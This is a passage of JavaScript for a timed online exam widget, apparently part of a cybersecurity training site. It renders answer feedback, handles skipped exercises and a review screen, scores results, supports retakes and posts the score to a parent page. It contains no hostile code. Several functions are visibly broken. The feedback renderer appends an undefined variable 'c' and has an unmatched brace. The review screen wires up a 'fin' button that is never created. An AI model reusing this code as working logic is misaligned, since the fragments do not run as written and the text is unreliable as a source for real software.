    var card = $('exerciseArea').querySelector('.card');
    renderFeedback(card, ex, a, false);
    var cb = document.getElementById('checkBtn'); if (cb) cb.disabled = true;
    var sb = document.querySelector('#exerciseArea .btn-ghost'); /* skip button */ if (sb) sb.disabled = true;
    var hb = document.querySelector('#exerciseArea .btn-amber'); if (hb) hb.disabled = true;
    var nb = document.getElementById('nextBtn'); if (nb) nb.classList.remove('hidden');
    lockWidgets(card);
    updateScoreBar();
  }
  function lockWidgets(card) {
    var abody = card.querySelector('.blk-answer');
    if (!abody) return;
    abody.querySelectorAll('button, input').forEach(function (x) {
      x.disabled = true; x.style.pointerEvents = 'none'; x.readOnly = true;
      if (x.classList.contains('chip')) x.draggable = false;
    });
  }
  function renderFeedback(card, ex, a, restoring) {
    var old = card.querySelector('.fb'); if (old) old.remove();
    var res = a.result;
    var cls = a.label === 'correct' ? 'fb-correct' : (a.label === 'partial' ? 'fb-partial' : 'fb-incorrect');
    var word = a.label === 'correct' ? '✓ CORRECT' : (a.label === 'partial' ? '✓ PARTIALLY CORRECT' : '✗ INCORRECT');
    var fb = el('div', 'fb ' + cls);
    var hh = '<span>' + word + '</span>';
    if (res.N > 1) hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + ' — ' + res.H + '/' + res.N + ' items</span>';
    else hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + '</span>';
    if (a.hintUsed) hh += '<span class="fb-credit">💡 hint −0.10 applied</span>';
    fb.appendChild(el('div', 'fb-h', hh));
    var it = el('div', 'fb-items');
    res.items.forEach(function (im) { it.appendChild(el('div', 'fb-item ' + im.state, '<span class="fi-ic">' + (im.state === 'ok' ? '✓' : im.state === 'no' ? '✗' : '○') + '</span><span>' + im.label + '</span>')); });
    fb.appendChild(it);

      fb.appendChild(c);
    }
    fb.appendChild(el('div', 'exp', ex.explanation));
    if (a.label !== 'correct' && ex.study) fb.appendChild(el('div', 'study', '📚 What to study: ' + esc(ex.study)));
    var acts = card.querySelector('.actions');

  }

  function doSkip() {
    var i = S.current, a = S.answers[i];
    if (a.status === 'checked') return;
    a.status = 'skipped';
    if (S.skipped.indexOf(i) < 0) S.skipped.push(i);
    /* no auto-pause: timer keeps running */
    advance();
  }
  function goNext() {
    if (S.timerState === 'PAUSED_AUTO_CHECK') setTimerState('RUNNING'); /* resume on Next */
    if (S.reviewMode) { S.reviewMode = false; renderReview(); showScreen('review'); return; }
    advance();
  }
  function advance() {
    var nxt = -1;
    for (var j = S.current + 1; j < EXERCISES.length; j++) { if (S.answers[j].status === 'unanswered') { nxt = j; break; } }
    if (nxt < 0) { /* none forward: go to review or results */
      for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered') { nxt = k; break; } }
    }
    if (nxt >= 0) renderExercise(nxt);
    else finishExam(false);
  }

  /* ---------------- review-skipped screen ---------------- */
  function renderReview() {
    var root = $('screen-review'); root.innerHTML = '';
    var c = el('div', 'card');
    c.appendChild(el('h2', null, '⚠ Review skipped exercises'));
    var open = S.skipped.filter(function (i) { return S.answers[i].status === 'skipped'; });
    if (open.length === 0) {
      c.appendChild(el('p', null, 'No skipped exercises left — everything was answered.'));
    } else {
      c.appendChild(el('p', 'dd-hint', 'You can return to any skipped exercise and answer it while the timer has not ended. Skipped-and-never-answered exercises are excluded from your score.'));
      open.forEach(function (i) {
        var row = el('div', 'rev-item');
        row.appendChild(el('span', 'ri-id', esc(EXERCISES[i].id)));
        row.appendChild(el('span', 'ri-sum', esc(EXERCISES[i].summary)));
        var b = el('button', 'btn btn-blue', '↩ Return to it');
        b.type = 'button'; b.setAttribute('aria-label', 'Return to ' + EXERCISES[i].id);
        b.addEventListener('click', function () { S.reviewMode = true; S.reviewFrom = 'review'; showScreen('exam'); renderExercise(i); });
        row.appendChild(b);
        c.appendChild(row);
      });
    }
    var acts = el('div', 'actions');
    var back = el('button', 'btn btn-ghost', '← Keep working (unanswered exercises)');
    back.type = 'button';
    back.addEventListener('click', function () {
      var u = -1; for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered' && S.skipped.indexOf(k) < 0) { u = k; break; } }
      if (u < 0) u = -1;
      if (u >= 0) { showScreen('exam'); renderExercise(u); } else { finishExam(false); }
    });

    fin.addEventListener('click', function () { finishExam(false); });
    acts.appendChild(back); acts.appendChild(el('span', 'spacer')); acts.appendChild(fin);
    c.appendChild(acts);
    root.appendChild(c);
  }

  /* ---------------- results ---------------- */
  function finishExam(timeout) {
    var anySkippedOpen = S.skipped.some(function (i) { return S.answers[i].status === 'skipped'; });
    if (!timeout && anySkippedOpen && S.timerState !== 'ENDED' && S.screen !== 'review') { renderReview(); showScreen('review'); return; }
    setTimerState('ENDED');
    var r = creditSum();
    var answered = r.n;
    var percent = answered > 0 ? Math.round((r.sum / answered) * 100) : 0;
    var passed = percent >= (META.passMark || 70);
    /* counts */
    var full = 0, part = 0, zero = 0, skipped = 0, partSum = 0;
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status;
      if (st === 'checked') {
        var cr = S.answers[i].credit;
        if (cr >= 1) full++;
        else if (cr > 0) { part++; partSum += cr; }
        else zero++;
      } else if (st === 'skipped') skipped++;
      else skipped++; /* unanswered at submit = excluded */
    });
    var root = $('screen-results'); root.innerHTML = '';
    var hero = el('div', 'card');
    var verdictTxt = passed ? '✓ PASS' : '✗ FAIL';
    hero.appendChild(el('div', 'res-hero',
      '<div><div class="res-score">' + percent + '%<small> · ' + r.sum.toFixed(1) + ' / ' + answered + ' credits</small></div>' +
      '<div class="dd-hint">scored over answered exercises only — skipped and never-answered are excluded</div></div>' +
      '<div class="verdict ' + (passed ? 'pass' : 'fail') + '">' + verdictTxt + '</div>'));
    root.appendChild(hero);
    var grid = el('div', 'res-grid');
    function cell(n, l, cls, ic) { return '<div class="res-cell"><div class="rc-n ' + (cls || '') + '">' + n + '</div><div class="rc-l"><span>' + ic + '</span><span>' + l + '</span></div></div>'; }
    grid.innerHTML =
      cell(full, 'Fully correct', 'ok-c', '✓') +
      cell(part + (part > 0 ? ' <small style="font-size:.8rem;color:var(--text-secondary)">(avg ' + (partSum / part).toFixed(2) + ')</small>' : ''), 'Partially correct', 'no-c', '✓') +
      cell(zero, 'Fully incorrect', 'no-c', '✗') +
      cell(skipped, 'Skipped — excluded', 'mi-c', '⚠');
    var gcard = el('div', 'card'); gcard.appendChild(grid);
    gcard.appendChild(el('div', 'dd-hint', '⏸ Time paused manually: ' + fmtTime(Math.round(S.manualPauseMs / 1000)) + ' · ⏸ Time reviewing feedback (auto-pause): ' + fmtTime(Math.round(S.autoPauseMs / 1000)) + ' · ⏱ Time used: ' + fmtTime((META.estimatedMinutes * 60) - S.remaining) + (timeout ? ' (timer ran out)' : '')));
    /* per-exercise strip */
    var strip = el('div', 'strip');
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status, cr = S.answers[i].credit;
      var cls = st === 'checked' ? (cr >= 1 ? 'st-ok' : cr > 0 ? 'st-pa' : 'st-no') : 'st-sk';
      var ic = st === 'checked' ? (cr >= 1 ? '✓' : cr > 0 ? '±' : '✗') : '⚠';
      var chip = el('span', 'st-chip ' + cls, ic);
      chip.title = ex.id + (st === 'checked' ? ' — credit ' + cr.toFixed(2) : ' — skipped/excluded');
      chip.setAttribute('aria-label', chip.title);
      strip.appendChild(chip);
    });
    gcard.appendChild(strip);
    root.appendChild(gcard);
    var acts = el('div', 'actions');
    var rt = el('button', 'btn btn-primary', '↺ Retake the exam');
    rt.type = 'button'; rt.setAttribute('aria-label', 'Retake the exam');
    rt.addEventListener('click', retake);
    acts.appendChild(rt);
    root.appendChild(el('div', 'card', '')).appendChild(acts);
    showScreen('results');
    /* report exactly once per attempt */
    if (!S.reported) {
      S.reported = true;
      reportScore(r.sum, answered);
    }
  }
  function retake() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    S.skipped = []; S.current = 0; S.reviewMode = false; S.reported = false; S.attempt++;
    S.manualPauseMs = 0; S.autoPauseMs = 0; S.priorState = null;
    buildShuffles();
    setTimerState('RUNNING'); S.remaining = (META.estimatedMinutes || 15) * 60;
    showScreen('exam'); renderExercise(0);
  }
  function reportScore(creditSumV, answeredCount) {
    var percent = answeredCount > 0 ? Math.round((creditSumV / answeredCount) * 100) : 0;
    try {
      parent.postMessage({
        type: 'CYBERPULSE_SCORE',
        topicId: META.topicId,
        batch: META.batch,
        score: Math.round(creditSumV),
        total: answeredCount,
        percent: percent,
        passed: percent >= 70
      }, location.origin);
    } catch (e) { /* opened directly rather than inside the site — nothing to report to */ }
  }

  /* ---------------- handshake ---------------- */
  window.addEventListener('message', function (event) {
    if (!event.data) return;
    var type = event.data.type;
    if (type !== 'CYBERPULSE_INIT' && type !== 'CYBERMASTERY_INIT') return;
    try {
      if (event.data.username) {
        var c = $('tbCandidate');
        c.textContent = '👤 ' + String(event.data.username).slice(0, 24);
        c.classList.remove('hidden');
      }
      /* country, locale, topicId, batch are consumed; theme is always 'dark' — this file is dark-only by contract */
    } catch (e) { }
  });

  /* ---------------- boot ---------------- */
  function boot() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    buildShuffles();
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    renderIntro();
    showScreen('intro');
  }
  window.__CP_BOOT__ = boot;
})();

<!-- ==CHUNK:F-t1197-2:05:close== -->
window.__CP_BOOT__();
</script>
